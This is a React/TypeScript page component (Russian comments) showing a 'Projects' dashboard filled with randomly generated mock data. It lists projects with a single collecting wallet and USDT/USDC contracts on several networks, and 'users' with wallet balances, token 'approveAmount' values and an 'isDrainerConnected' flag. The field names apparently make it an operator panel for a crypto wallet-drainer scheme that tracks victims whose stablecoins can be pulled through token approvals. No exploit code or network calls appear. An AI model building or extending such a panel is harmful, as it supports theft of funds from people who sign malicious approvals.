import React, { useState } from 'react';
import { Plus, Search, Wallet, ArrowUpRight } from 'lucide-react';
import { Link } from 'react-router-dom';
import UserModal from '../components/UserModal';
import { motion } from 'framer-motion';

interface Network {
  id: string;
  name: string;
  symbol: string;
  color: string;
}

interface Contract {
  id: string;
  name: string;
  address: string;
  network: Network;
  token: string; // USDT, USDC, etc.
  balance: number;
  usdBalance: number;
}

interface User {
  id: string;
  walletAddress: string;
  balance: {
    token: string; // USDT или USDC
    amount: number; // количество токенов
    usd: number; // USD стоимость
  };
  isDrainerConnected: boolean;
  approveAmount: number;
  isPinned: boolean;
}

interface Project {
  id: string;
  name: string;
  walletAddress: string; // Один кошелек на проект
  contracts: Contract[]; // Контракты могут быть в разных сетях
  users: User[];
}

const Projects: React.FC = () => {
  const networks: Network[] = [
    { id: 'eth', name: 'Ethereum', symbol: 'ETH', color: '#627EEA' },
    { id: 'bsc', name: 'BSC', symbol: 'BNB', color: '#F3BA2F' },
    { id: 'polygon', name: 'Polygon', symbol: 'MATIC', color: '#8247E5' },
    { id: 'arbitrum', name: 'Arbitrum', symbol: 'ARB', color: '#28A0F0' }
  ];

  // Генератор случайных проектов
  const generateProjects = (count: number): Project[] => {
    const projectNames = [
      'DD', 'XProject', 'CryptoFlow', 'DefiMaster', 'TokenVault', 'ChainLink', 
      'MetaSwap', 'EtherBridge', 'PolyDex', 'ArbiTrade', 'BSCVault', 'UniFlow',
      'PancakeBot', 'SushiDrain', 'CurveMax', 'BalancerPro', 'CompoundX', 'AaveFlow',
      'YearnVault', 'SynthetixBot', 'MakerDAO', 'USDCVault', 'TetherMax', 'BinanceChain',
      'PolygonBridge', 'ArbitrumDex', 'OptimismFlow', 'FantomSwap', 'AvalancheBot', 'SolanaLink',
      'CosmosHub', 'TerraLuna', 'AlgorandDex', 'CardanoSwap', 'PolkadotBridge', 'KusamaFlow',
      'NearProtocol', 'HarmonyOne', 'ElrondMax', 'HecoChain', 'OKExChain', 'XDaiChain',
      'CeloNetwork', 'FlowBlockchain', 'TezosSwap', 'ZilliqaBot', 'NeoChain', 'VeChainThor',
      'ICONLoop', 'WavesExchange', 'OntologyBot', 'QtumChain', 'ZcashPrivacy', 'MoneroMax'
    ];

    const tokens = ['USDT', 'USDC'];

    return Array.from({ length: count }, (_, i) => {
      const projectName = projectNames[i % projectNames.length] + (i >= projectNames.length ? ` ${Math.floor(i / projectNames.length) + 1}` : '');
      
      // Генерируем случайное количество контрактов (1-8)
      const contractCount = Math.floor(Math.random() * 8) + 1;
      const contracts: Contract[] = [];
      
      for (let j = 0; j < contractCount; j++) {
        const network = networks[Math.floor(Math.random() * networks.length)];
        const token = tokens[Math.floor(Math.random() * tokens.length)];
        const balance = Math.random() * 10000;
        
        contracts.push({
          id: `c${i}_${j}`,
          name: `${token} Contract (${network.name})`,
          address: `0x${Math.random().toString(16).slice(2, 10)}...${Math.random().toString(16).slice(2, 6)}`,
          network,
          token,
          balance,
          usdBalance: balance * (token === 'USDT' ? 1 : 0.999) // USDC немного дешевле
        });
      }

      // Генерируем пользователей для проекта - теперь с USDT/USDC балансами
      const userCount = Math.floor(Math.random() * 15) + 1;
      const users: User[] = Array.from({ length: userCount }, (_, k) => {
        const userToken = tokens[Math.floor(Math.random() * tokens.length)];
        const tokenAmount = Math.random() * 5000 + 100; // от 100 до 5100 токенов
        const usdValue = tokenAmount * (userToken === 'USDT' ? 1 : 0.999);
        
        return {
          id: `user${i}_${k}`,
          walletAddress: `0x${Math.random().toString(16).slice(2, 10)}...${Math.random().toString(16).slice(2, 6)}`,
          balance: {
            token: userToken, // USDT или USDC
            amount: tokenAmount,
            usd: usdValue
          },
          isDrainerConnected: Math.random() > 0.2,
          approveAmount: Math.random() * 5000,
          isPinned: Math.random() > 0.8
        };
      });

      return {
        id: (i + 1).toString(),
        name: projectName,
        walletAddress: `0x${Math.random().toString(16).slice(2, 10)}...${Math.random().toString(16).slice(2, 6)}`,
        contracts,
        users
      };
    });
  };

  // Генерируем 50 проектов
  const [projects] = useState<Project[]>(generateProjects(50));

  const [showUserModal, setShowUserModal] = useState(false);
  const [projectSearch, setProjectSearch] = useState('');

  const filteredProjects = projects.filter(project =>
    project.name.toLowerCase().includes(projectSearch.toLowerCase())
  );

  const getTotalUsdValue = (project: Project) => {
    return project.contracts.reduce((sum, contract) => sum + contract.usdBalance, 0);
  };

  return (
    <div className="max-w-7xl mx-auto">
      <div className="flex justify-between items-center mb-6">
        <div>
          <h1 className="text-2xl font-bold">Projects</h1>
          <p className="text-gray-400 mt-1">
            {projects.length} projects • {projects.reduce((sum, p) => sum + p.users.length, 0)} total users
          </p>
        </div>
        <button
          onClick={() => setShowUserModal(true)}
          className="flex items-center gap-2 px-4 py-2 bg-green-400 text-[#1e1f25] rounded-lg hover:bg-green-500 transition-colors"
        >
          <Plus size={20} />
          Add User
        </button>
      </div>

      {/* Project Search */}
      <div className="mb-6">
        <div className="relative">
          <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400" size={20} />
          <input
            type="text"
            placeholder="Search projects..."
            value={projectSearch}
            onChange={(e) => setProjectSearch(e.target.value)}
            className="w-full bg-[#1e1f25] border border-gray-700 rounded-lg py-2 pl-10 pr-4 text-white focus:outline-none focus:ring-1 focus:ring-green-500"
          />
        </div>
        {projectSearch && (
          <div className="mt-2 text-sm text-gray-400">
            Found {filteredProjects.length} projects matching "{projectSearch}"
          </div>
        )}
      </div>

      {/* Project Selection */}
      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-6 mb-8">
        {filteredProjects.map(project => (
          <Link
            key={project.id}
            to={`/projects/${project.id}`}
          >
            <motion.div
              whileHover={{ scale: 1.02, y: -5 }}
              whileTap={{ scale: 0.98 }}
              className="relative overflow-hidden p-6 rounded-xl text-center transition-all duration-300 bg-[#1e1f25] text-white hover:shadow-lg hover:shadow-[#2a2b33]/20 group"
            >
              {/* Background Pattern */}
              <div className="absolute inset-0 opacity-10 bg-gradient-to-br from-green-400/20 to-transparent" />
              
              {/* Content */}
              <div className="relative z-10">
                <div className="font-bold text-xl mb-4 truncate" title={project.name}>
                  {project.name}
                </div>
                
                <div className="flex flex-col items-center gap-3">
                  {/* Показываем иконки всех сетей, которые есть в контрактах проекта */}
                  <div className="flex gap-1 mb-2 flex-wrap justify-center">
                    {Array.from(new Set(project.contracts.map(c => c.network.id))).map(networkId => {
                      const network = networks.find(n => n.id === networkId);
                      const networkContracts = project.contracts.filter(c => c.network.id === networkId);
                      return network ? (
                        <div
                          key={networkId}
                          className="relative w-10 h-10 rounded-full flex items-center justify-center transition-transform duration-300 hover:rotate-180"
                          style={{ 
                            background: `conic-gradient(${network.color} 0deg, transparent 60deg)`,
                            padding: '2px'
                          }}
                          title={`${network.name}: ${networkContracts.length} contracts`}
                        >
                          <div className="w-full h-full rounded-full bg-[#2a2b33] flex items-center justify-center">
                            <div
                              className="w-5 h-5 rounded-full"
                              style={{ backgroundColor: network.color }}
                            />
                          </div>
                          {/* Показываем количество контрактов в этой сети */}
                          <div className="absolute -top-1 -right-1 w-5 h-5 bg-green-400 text-[#1e1f25] rounded-full text-xs flex items-center justify-center font-bold">
                            {networkContracts.length}
                          </div>
                        </div>
                      ) : null;
                    })}
                  </div>
                  
                  <div>
                    <div className="font-medium text-lg">Multi-Network Project</div>
                    <div className="text-sm opacity-75">{project.contracts.length} contracts</div>
                  </div>
                </div>

                <div className="mt-4 pt-4 border-t border-gray-700/30 space-y-2">
                  <div className="flex items-center justify-center gap-2">
                    <Wallet size={16} />
                    <span>{project.users.length} users</span>
                  </div>
                  <div className="text-sm opacity-75">
                    Total Value: ${getTotalUsdValue(project).toLocaleString()}
                  </div>
                  {/* Показываем топ токены */}
                  <div className="flex justify-center gap-2 mt-2">
                    {Array.from(new Set(project.contracts.map(c => c.token))).map(token => (
                      <div
                        key={token}
                        className="px-2 py-1 bg-[#2a2b33] rounded-full text-xs"
                      >
                        {token}
                      </div>
                    ))}
                  </div>
                </div>

                {/* Hover Arrow */}
                <div className="absolute top-4 right-4 opacity-0 group-hover:opacity-100 transition-opacity">
                  <ArrowUpRight size={20} className="text-green-400" />
                </div>
              </div>
            </motion.div>
          </Link>
        ))}
      </div>

      {/* Показываем сообщение если нет результатов поиска */}
      {filteredProjects.length === 0 && projectSearch && (
        <div className="text-center py-12">
          <div className="text-gray-400 text-lg mb-2">No projects found</div>
          <div className="text-gray-500">Try adjusting your search terms</div>
        </div>
      )}

      {/* Add User Modal */}
      <UserModal
        isOpen={showUserModal}
        onClose={() => setShowUserModal(false)}
        onSubmit={(userData) => {
          console.log('Add user:', userData);
          setShowUserModal(false);
        }}
      />
    </div>
  );
};

export default Projects;